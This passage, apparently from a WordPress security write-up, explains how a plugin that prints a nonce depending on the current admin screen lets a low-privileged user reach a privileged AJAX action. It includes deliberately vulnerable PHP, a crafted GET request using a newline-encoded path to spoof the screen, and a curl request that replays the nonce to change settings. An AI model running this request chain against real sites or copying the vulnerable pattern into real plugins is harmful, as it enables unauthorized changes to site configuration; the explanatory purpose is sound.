...
Another case for nonce leakage to broken access control occurs if the plugin is assigning the nonce based on the current screen. In such case, it is possible to tamper the current screen as an authenticated user to grab the nonce.

```php
// Enqueue admin script only on specific screens
// Expose nonce based on current screen
add_action( 'admin_enqueue_scripts', function () {
	...
	if ( ! $screen || $screen->id !== 'my_plugin_page_settings' ) {
		return;
	}

	echo "Nonce here:";
	echo wp_create_nonce( 'my_plugin_nonce' );
} );

// Privileged AJAX action
add_action( 'wp_ajax_update_settings', function () {
	check_ajax_referer( 'my_plugin_nonce', 'nonce' );

	update_option( 'tamper_options', true );

	wp_send_json_success();
} );
```

In this case, it is possible to request below to get access to the nonce:

```bash
GET /wp-admin/index.php/%0a/wp-admin/my_plugin_page_settings HTTP/1.1
```

After getting access to the nonce, an attacker can just send an authenticated request with the nonce:

```bash
curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_settings -d "nonce=nonce_from_above"
```
